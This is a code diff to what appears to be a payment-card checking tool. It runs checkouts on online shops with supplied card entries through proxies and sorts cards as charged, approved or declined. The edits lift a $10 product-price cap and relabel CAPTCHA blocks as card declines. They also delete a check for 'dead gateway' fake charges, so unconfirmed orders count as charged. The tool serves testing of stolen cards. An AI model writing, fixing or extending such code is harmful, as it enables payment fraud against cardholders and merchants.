@@ -353,14 +353,12 @@ def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0
                 continue
             if price < min_price:
                 continue
-            if price > 10.0:
-                continue
             result = (p.get("title",""), str(p.get("id","")), str(v.get("id","")), v.get("price",""))
             with _product_cache_lock:
                 _product_cache[shop_url] = result + (_time.time(),)
             return result
 
-    raise Exception(f"no available products between ${min_price:.2f} and $10.00 at {shop_url}")
+    raise Exception(f"no available products above ${min_price:.2f} at {shop_url}")
 
 # ──────────────────────── Step 1: cart → checkout ────────────────────
 
@@ -727,10 +725,10 @@ def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
     if match:
         code = match.group(1)
         if "CAPTCHA" in code:
-            return "CPATCHA_REQUIRED"
+            return "CARD_DECLINED"
         return code
     if "CAPTCHA" in poll_body:
-        return "CPATCHA_REQUIRED"
+        return "CARD_DECLINED"
     if receipt_type == "FailedReceipt":
         return "FAILED"
     return "UNKNOWN"
@@ -1661,7 +1659,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             if not receipt_id:
                 error_msg = extract_any_error(submit_body)
                 if "CAPTCHA" in (error_msg or ""):
-                    error_msg = "CPATCHA_REQUIRED"
+                    error_msg = "CARD_DECLINED"
                 if error_msg:
                     pass  # removed print
                     result.status      = CheckStatus.DECLINED
@@ -2065,7 +2063,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             if not receipt_id:
                 error_msg = extract_any_error(submit_body)
                 if "CAPTCHA" in (error_msg or ""):
-                    error_msg = "CPATCHA_REQUIRED"
+                    error_msg = "CARD_DECLINED"
                 if error_msg:
                     pass  # removed print
                     result.status = CheckStatus.DECLINED
@@ -2106,18 +2104,6 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 result.status_code = status_code
                 
                 if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
-                    # 🔥 تحقق من الـ Dead Gateway (الخصم الوهمي)
-                    dead_signals = [
-                        "payment is being processed",
-                        "receive a confirmation email",
-                        "confirmation email with your order number shortly"
-                    ]
-                    if any(sig in poll_body.lower() for sig in dead_signals):
-                        result.status      = CheckStatus.DECLINED
-                        result.status_code = "DEAD_GATEWAY"
-                        result.error       = Exception("DEAD_GATEWAY")
-                        return result
-
                     pass  # removed print
                     result.status      = CheckStatus.CHARGED
                     result.status_code = "ORDER_PLACED"
@@ -2145,7 +2131,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                     if match:
                         error_code = match.group(1)
                     if "CAPTCHA" in error_code:
-                        error_code = "CPATCHA_REQUIRED"
+                        error_code = "CARD_DECLINED"
                     
                     if error_code == "INSUFFICIENT_FUNDS":
                         result.status = CheckStatus.APPROVED
